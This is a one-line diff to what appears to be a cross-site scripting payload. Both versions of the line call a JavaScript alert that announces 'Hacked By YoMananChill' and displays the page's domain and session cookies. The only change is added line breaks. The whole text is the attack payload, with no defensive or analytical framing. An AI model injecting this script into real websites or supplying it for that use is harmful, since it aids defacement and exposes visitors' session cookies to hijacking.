@@ -1,1 +1,1 @@
-alert("Hacked By YoMananChill\n" + document.domain + "\n" + document.cookie);
+alert("Hacked By YoMananChill\n\n" + document.domain + "\n\n" + document.cookie);
